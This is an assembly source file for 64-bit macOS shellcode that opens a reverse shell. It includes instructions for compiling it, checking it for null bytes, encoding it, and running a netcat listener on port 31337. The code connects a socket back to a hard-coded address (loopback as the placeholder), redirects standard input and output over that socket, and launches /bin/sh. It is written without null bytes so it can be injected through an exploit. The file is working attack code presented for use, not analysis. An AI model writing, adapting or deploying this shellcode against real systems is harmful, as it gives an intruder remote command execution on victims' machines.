; Shellcode: Reverse shell for macOS (64-bit)
;
; Uses specific instructions to avoid null bytes in compiled machine code.
; Syscall refs: https://sigsegv.pl/osx-bsd-syscalls/
;
; Compile:  nasm -O0 reverse_shell.asm
; Check:    hexdump -C reverse_shell | grep --color=auto 00
; Encode:   xxd -i reverse_shell
; Listener: nc -v -l -p 31337  # BSD
;           nc -v -l 31337     # Linux
;
bits 64

section .text

global start

start:
    push 0x1ffffff
    pop r9
    inc r9 ; 0x2000000 (macos syscall mask)

    ; s = socket(2, 1, 0)
    push byte 97
    pop rax           ; syscall: socket()
    or rax, r9
    push byte 2
    pop rdi           ;     domain: PF_INET (2)
    push byte 1
    pop rsi           ;     type: SOCK_STREAM (1)
    xor rdx, rdx      ;     protocol (0)
    syscall           ; rax = socket(domain, type, protocol)
    mov r8, rax       ; r8 = s

    ; connect(s, [2, 31337, <ip>], 16)
    push r8
    pop rdi           ; s
    push byte 98
    pop rax           ; syscall: connect()
    or rax, r9
    ; build sockaddr
    push dword 0x0100007f ; ip: 127.0.0.1
    push word 0x697a      ; port: 31337
    push word 0x2         ; af: AF_INET (2)
    mov rsi, rsp
    push byte 16
    pop rdx           ; sizeof(sockaddr)
    syscall

    ; dup2(s, f...)
    push byte 2
    pop rcx
dup_loop:
    push byte 90
    pop rax           ; syscall: dup2()
    or rax, r9
    mov rdi, r8       ; s
    mov rsi, rcx      ; f
    push rcx
    syscall
    pop rcx
    dec rcx
    jns short dup_loop

    ; execve("/bin/sh", 0, 0)
    push byte 59
    pop rax           ; syscall: execve()
    or rax, r9
    xor rdx, rdx      ; envp
    mov qword rcx, "//bin/sh" ; string aligned to qword size
    shr rcx, 0x8      ; null terminate
    push rcx
    mov rdi, rsp      ; fname
    xor rsi, rsi      ; argp
    syscall
